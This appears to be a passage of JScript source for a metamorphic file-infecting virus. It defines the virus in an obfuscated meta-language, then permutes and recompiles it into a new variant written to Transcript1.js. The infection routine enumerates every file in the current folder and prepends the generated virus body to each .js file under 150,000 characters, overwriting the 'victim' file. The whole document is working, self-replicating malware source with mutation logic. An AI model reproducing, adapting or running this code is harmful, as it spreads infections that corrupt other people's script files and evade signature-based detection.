    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n59n#)4x#2x#,#x5fGiveMeString(#n59n#)5x#)1O#1x#';

MetaLevelLanguage+='__(3800|3200)ysFinalCode=#x1fRemoveVariableMask(#x2sFinalCode2x#)1x#';
MetaLevelLanguage+='__(3900|3200)ysFinalCode=#x1fRemoveVariableIndicator(#x2sFinalCode2x#)1x#';

MetaLevelLanguage+='__(4100|)def sfso=#x1#O1WScript#.CreateObject(#x2#"Scripting.FileSystemObject"#2x#)1O#1x#';

MetaLevelLanguage+='__(5000|4100)def CurrentFolder=#x1#O1sfso#.GetFolder(#x2#"."#2x#)1O#1x#';
MetaLevelLanguage+='__(5100|5000)def AllFiles=#x1#O1CurrentFolder#.Files1O#1x#';
MetaLevelLanguage+='__(5200|5100)def FilesC=#x1new Enumerator(#x2AllFiles2x#)1x#';
MetaLevelLanguage+='__(5300|5200)x#x1#O1FilesC#.moveFirst()1O#1x#';
MetaLevelLanguage+='__(5400|3500,3600,3700,3800,3900,5300)while($#x1#O1FilesC#.atEnd()1O#1x#!#x2false2x#?==@)014';
    MetaLevelLanguage+='__(NF10|)var FileName=#x1#O1FilesC#.item()1O#1x#';
    MetaLevelLanguage+='__(NF20|NF10)var FExt=#x1#O1sfso#.GetExtensionName(#x2°+FileName+°2x#)1O#1x#';
    MetaLevelLanguage+='__(NF30|NF20)if(#x1#O1°+FExt+°#.toUpperCase()1O#1x#!#x2#"JS"#2x#?==)009';        
        MetaLevelLanguage+='__(NFA10|)var hFileRead=#x1#O1sfso#.OpenTextFile(#x2°+FileName+°2x#,#x3#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(NFA20|NFA10)var AllVictimData=#x1#O1°+hFileRead+°#.ReadAll()1O#1x#';
        MetaLevelLanguage+='__(NFA30|NFA20)x#x1#O1°+hFileRead+°#.close()1O#1x#';
        MetaLevelLanguage+='__(NFA50|NFA30)if(#x1#O1°+AllVictimData+°#.length1O#1x#!#x2#n150000n#2x#?<)004';
            MetaLevelLanguage+='__(NFB10|)var hFileWrite=#x1#O1sfso#.OpenTextFile(#x2°+FileName+°2x#,#x3#n2n#3x#)1O#1x#';        
            MetaLevelLanguage+='__(NFB20|)var NewVictimCode=#x1#x2sFinalCode2x#+#x3fGiveMeString(#n13n#)3x#+#x5fGiveMeString(#n10n#)5x#+ #x4°+AllVictimData+°4x#1x#';            
            MetaLevelLanguage+='__(NFB30|NFB10,NFB20)x#x1#O1°+hFileWrite+°#.Write(#x2°+NewVictimCode+°2x#)1O#1x#';
            MetaLevelLanguage+='__(NFB40|NFB30)x#x1#O1°+hFileWrite+°#.close()1O#1x#';   
        MetaLevelLanguage+='__(NFA60|)000';     
    MetaLevelLanguage+='__(NF31|)000';          
    MetaLevelLanguage+='__(NF40|NF10)y#x1#O1FilesC#.moveNext()1O#1x#';


OriginalMetaCode=MetaLevelLanguage;

PreCompilation();
WScript.Echo("after Precompilation")
FullCodeArray=MetaLevelLanguage.split('__');

PermCodeArray=Permutator(FullCodeArray.slice());
WScript.Echo("after permutator")
HierarchyOfCalls=0;
NewCode=CreateBlockOfCode(PermCodeArray);
WScript.Echo("after CreateBlockOfCode"+nnn+"VarDefs: "+VarDefs.length+nnn+"FunctionDefs: "+FunctionDefs.length)
FunctionNames.reverse();
FunctionDefs.reverse();                          
FunctionArgs.reverse();
VarDefs.reverse();
VarNames.reverse();

FinalCode=CreateVarsAndFuncts(NewCode);
WScript.Echo("after CreateVarsAndFuncts")
FinalCode=FinalCode.replace(/!@}/g,'');
FinalCode=FinalCode.replace(/!@{/g,'');
FinalCode=FinalCode.replace(/@}/g,'}'+s(13)+s(10));
FinalCode=FinalCode.replace(/@{/g,'{'+s(13)+s(10));
FinalCode=FinalCode.replace(/@;/g,';'+s(13)+s(10));

FinalCode=RemoveVariableMask(FinalCode);
FinalCode=RemoveVariableIndicator(FinalCode);

WScript.Echo(FinalCode)

fso=WScript.CreateObject("Scripting.FileSystemObject");
file=fso.CreateTextFile('Transcript1.js');file.Write(FinalCode);file.close();
